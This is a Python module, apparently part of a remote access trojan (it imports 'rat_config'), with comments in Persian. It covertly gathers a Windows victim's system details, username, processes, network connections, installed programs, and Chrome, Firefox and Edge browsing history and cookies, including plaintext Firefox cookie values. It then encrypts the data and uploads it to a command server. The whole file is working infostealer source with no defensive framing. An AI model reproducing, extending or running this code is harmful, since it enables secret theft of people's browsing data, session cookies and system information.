import platform
import psutil
import socket
import json
import time
import logging
import subprocess
import os
import getpass
import sqlite3
import winreg
from datetime import datetime, timedelta
from rat_config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator, CommunicationError

class SystemCollector:
    def __init__(self):
        self.logger = logging.getLogger("SystemCollector")
        self.client_id = Config.get_client_id()
        self.encryption_manager = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption_manager)
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "client_id": self.client_id,
            "browser_data": {},
            "installed_programs": [],
            "system_info": {},
            "running_processes": [],
            "network_info": {}
        }

    def _run_command(self, cmd: list, timeout: int = 30) -> dict:
        """اجرای دستور با مدیریت خطا"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {"status": "success", "stdout": result.stdout, "stderr": result.stderr}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "stdout": e.stdout, "stderr": e.stderr}
        except Exception as e:
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def collect_system_info(self):
        """جمع‌آوری اطلاعات سیستم"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("System info collection disabled")
            return {"message": "System info collection disabled"}

        self.logger.info("Collecting system information...")
        try:
            system_info = {
                "os_name": platform.system(),
                "os_version": platform.version(),
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "ram_total_mb": round(psutil.virtual_memory().total / (1024 * 1024), 2),
                "ram_available_mb": round(psutil.virtual_memory().available / (1024 * 1024), 2),
                "cpu_cores": psutil.cpu_count(),
                "cpu_usage": psutil.cpu_percent(interval=1),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat()
            }
            
            # جمع‌آوری اطلاعات دیسک
            try:
                disk_usage = psutil.disk_usage('/')
                system_info.update({
                    "disk_total_gb": round(disk_usage.total / (1024**3), 2),
                    "disk_used_gb": round(disk_usage.used / (1024**3), 2),
                    "disk_free_gb": round(disk_usage.free / (1024**3), 2)
                })
            except Exception as e:
                system_info["disk_error"] = str(e)

            self.results["system_info"] = system_info
            self.logger.info("System information collected successfully")
            return system_info

        except Exception as e:
            error_msg = f"Failed to collect system info: {str(e)}"
            self.results["system_info"]["error"] = error_msg
            self.logger.error(error_msg)
            return {"error": error_msg}

    def collect_running_processes(self):
        """جمع‌آوری لیست فرآیندهای در حال اجرا"""
        if not Config.COLLECT_RUNNING_PROCESSES:
            self.logger.info("Running processes collection disabled")
            return []

        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'username': proc.info['username'],
                        'memory_mb': round(proc.info['memory_info'].rss / (1024 * 1024), 2),
                        'cpu_percent': proc.info['cpu_percent']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            # مرتب‌سازی بر اساس مصرف memory
            processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            self.results["running_processes"] = processes[:50]  # فقط 50 فرآیند اول
            self.logger.info(f"Collected {len(processes)} running processes")
            return processes[:50]
        except Exception as e:
            self.logger.error(f"Failed to collect running processes: {str(e)}")
            return []

    def collect_network_info(self):
        """جمع‌آوری اطلاعات شبکه"""
        if not Config.COLLECT_NETWORK_INFO:
            self.logger.info("Network info collection disabled")
            return {}

        try:
            network_info = {
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "network_interfaces": []
            }

            # اطلاعات interfaceهای شبکه
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {
                    "interface": interface,
                    "addresses": []
                }
                for addr in addrs:
                    interface_info["addresses"].append({
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })
                network_info["network_interfaces"].append(interface_info)

            # اتصالات شبکه
            try:
                connections = []
                for conn in psutil.net_connections(kind='inet'):
                    try:
                        connections.append({
                            "fd": conn.fd,
                            "family": str(conn.family),
                            "type": str(conn.type),
                            "laddr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                            "raddr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                            "status": conn.status
                        })
                    except:
                        continue
                network_info["connections"] = connections[:100]  # محدود کردن تعداد
            except:
                network_info["connections_error"] = "Unable to get network connections"

            self.results["network_info"] = network_info
            self.logger.info("Network information collected successfully")
            return network_info

        except Exception as e:
            self.logger.error(f"Failed to collect network info: {str(e)}")
            return {"error": str(e)}

    def collect_browser_data(self):
        """جمع‌آوری داده‌های مرورگر"""
        if not Config.ENABLE_BROWSER_DATA_COLLECTION:
            self.logger.info("Browser data collection disabled")
            return {}

        self.logger.info("Collecting browser data...")
        try:
            browser_data = {}

            # Chrome
            if Config.COLLECT_CHROME_DATA:
                chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
                if os.path.exists(chrome_path):
                    browser_data["chrome"] = self._get_browser_data(chrome_path, "Chrome")

            # Firefox
            if Config.COLLECT_FIREFOX_DATA:
                firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
                if os.path.exists(firefox_path):
                    for profile in os.listdir(firefox_path):
                        places_path = os.path.join(firefox_path, profile, "places.sqlite")
                        if os.path.exists(places_path):
                            browser_data["firefox"] = self._get_browser_data(places_path, "Firefox")
                            break

            # Edge
            if Config.COLLECT_EDGE_DATA:
                edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
                if os.path.exists(edge_path):
                    browser_data["edge"] = self._get_browser_data(edge_path, "Edge")

            self.results["browser_data"] = browser_data
            self.logger.info("Browser data collected successfully")
            return browser_data

        except Exception as e:
            self.results["browser_data"]["error"] = str(e)
            self.logger.error(f"Failed to collect browser data: {str(e)}")
            return {"error": str(e)}

    def _get_browser_data(self, db_path: str, browser: str) -> dict:
        """استخراج داده‌های مرورگر"""
        try:
            # ایجاد کپی موقت از دیتابیس برای جلوگیری از قفل شدن
            temp_db = f"temp_{browser.lower()}_db_{int(time.time())}.sqlite"
            with open(db_path, 'rb') as src, open(temp_db, 'wb') as dst:
                dst.write(src.read())

            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()

            result = {"history": [], "cookies": []}

            # جمع‌آوری تاریخچه
            if Config.COLLECT_HISTORY:
                try:
                    if browser == "Firefox":
                        cursor.execute("""
                            SELECT url, title, visit_date/1000000 as visit_time 
                            FROM moz_historyvisits 
                            JOIN moz_places ON moz_places.id = moz_historyvisits.place_id 
                            ORDER BY visit_date DESC LIMIT 100
                        """)
                    else:
                        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    
                    for row in cursor.fetchall():
                        visit_time = row['last_visit_time'] if browser != "Firefox" else row['visit_time']
                        if browser != "Firefox":
                            visit_time = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                        else:
                            visit_time = datetime.fromtimestamp(visit_time)
                        result["history"].append({
                            "url": row['url'],
                            "title": row['title'] or "No title",
                            "visit_time": visit_time.isoformat()
                        })
                except Exception as e:
                    self.logger.error(f"Failed to collect {browser} history: {str(e)}")

            # جمع‌آوری کوکی‌ها
            if Config.COLLECT_COOKIES:
                try:
                    if browser == "Firefox":
                        cursor.execute("""
                            SELECT host, name, value, last_accessed/1000000 as last_accessed 
                            FROM moz_cookies 
                            ORDER BY last_accessed DESC LIMIT 100
                        """)
                        for row in cursor.fetchall():
                            result["cookies"].append({
                                "host": row['host'],
                                "name": row['name'],
                                "value": row['value'],
                                "last_accessed": datetime.fromtimestamp(row['last_accessed']).isoformat()
                            })
                    else:
                        cookie_path = os.path.join(os.path.dirname(db_path), "Cookies")
                        if os.path.exists(cookie_path):
                            temp_cookie_db = f"temp_{browser.lower()}_cookies_{int(time.time())}.sqlite"
                            with open(cookie_path, 'rb') as src, open(temp_cookie_db, 'wb') as dst:
                                dst.write(src.read())
                            
                            cookie_conn = sqlite3.connect(temp_cookie_db)
                            cookie_conn.row_factory = sqlite3.Row
                            cookie_cursor = cookie_conn.cursor()
                            cookie_cursor.execute("""
                                SELECT host_key, name, encrypted_value, last_access_utc 
                                FROM cookies 
                                ORDER BY last_access_utc DESC LIMIT 100
                            """)
                            for row in cookie_cursor.fetchall():
                                result["cookies"].append({
                                    "host": row['host_key'],
                                    "name": row['name'],
                                    "value": "Encrypted",
                                    "last_accessed": (datetime(1601, 1, 1) + timedelta(microseconds=row['last_access_utc'])).isoformat()
                                })
                            cookie_conn.close()
                            os.remove(temp_cookie_db)
                except Exception as e:
                    self.logger.error(f"Failed to collect {browser} cookies: {str(e)}")

            conn.close()
            os.remove(temp_db)
            return result

        except Exception as e:
            self.logger.error(f"Failed to process {browser} database: {str(e)}")
            return {"history": [], "cookies": [], "error": str(e)}

    def collect_installed_programs(self):
        """جمع‌آوری برنامه‌های نصب شده"""
        if not Config.COLLECT_INSTALLED_PROGRAMS:
            self.logger.info("Installed programs collection disabled")
            return []

        self.logger.info("Collecting installed programs...")
        try:
            programs = []
            reg_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for reg_path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if winreg.QueryValueEx(subkey, "DisplayVersion")[1] == 1 else "N/A"
                            publisher = winreg.QueryValueEx(subkey, "Publisher")[0] if winreg.QueryValueEx(subkey, "Publisher")[1] == 1 else "N/A"
                            install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if winreg.QueryValueEx(subkey, "InstallDate")[1] == 1 else "N/A"
                            
                            programs.append({
                                "name": display_name,
                                "version": version,
                                "publisher": publisher,
                                "install_date": install_date
                            })
                        except FileNotFoundError:
                            continue
                        finally:
                            winreg.CloseKey(subkey)
                    winreg.CloseKey(key)
                except Exception as e:
                    self.logger.error(f"Failed to read registry path {reg_path}: {str(e)}")

            self.results["installed_programs"] = programs
            self.logger.info(f"Collected {len(programs)} installed programs")
            return programs

        except Exception as e:
            self.results["installed_programs"] = {"error": str(e)}
            self.logger.error(f"Failed to collect installed programs: {str(e)}")
            return []

    def collect_all_data(self):
        """جمع‌آوری تمام داده‌ها"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("System data collection disabled")
            return {"message": "System data collection disabled"}

        self.logger.info("Starting comprehensive system data collection...")
        
        # جمع‌آوری اطلاعات اصلی
        self.collect_system_info()
        
        # جمع‌آوری اطلاعات اختیاری
        if Config.COLLECT_RUNNING_PROCESSES:
            self.collect_running_processes()
        
        if Config.COLLECT_NETWORK_INFO:
            self.collect_network_info()
        
        if Config.ENABLE_BROWSER_DATA_COLLECTION:
            self.collect_browser_data()
        
        if Config.COLLECT_INSTALLED_PROGRAMS:
            self.collect_installed_programs()

        self.logger.info("Comprehensive system data collection completed")
        return self.results

    def send_data(self):
        """ارسال داده‌ها به سرور"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("Data sending disabled")
            return

        self.logger.info("Sending collected data to server...")
        try:
            # ارسال اطلاعات سیستم
            encrypted_system_info = self.encryption_manager.encrypt(json.dumps(self.results["system_info"]))
            self.communicator._send_request(
                "action=upload_data",
                data={
                    "client_id": self.client_id,
                    "system_info": encrypted_system_info
                }
            )

            # ارسال اطلاعات مرورگر
            if self.results["browser_data"]:
                encrypted_browser_data = self.encryption_manager.encrypt(json.dumps(self.results["browser_data"]))
                self.communicator._send_request(
                    "action=upload_browser_data",
                    data={
                        "client_id": self.client_id,
                        "browser_data": encrypted_browser_data
                    }
                )

            self.logger.info("All data sent successfully")

        except CommunicationError as e:
            self.logger.error(f"Failed to send data: {str(e)}")

    def run(self):
        """اجرای کامل فرآیند جمع‌آوری و ارسال"""
        if not Config.ENABLE_SYSTEM_INFO:
            self.logger.info("System collector disabled in config")
            return

        self.logger.info("Starting system data collection and upload...")
        self.collect_all_data()
        self.send_data()
        self.logger.info("System data collection and upload completed")

if __name__ == "__main__":
    collector = SystemCollector()
    collector.run()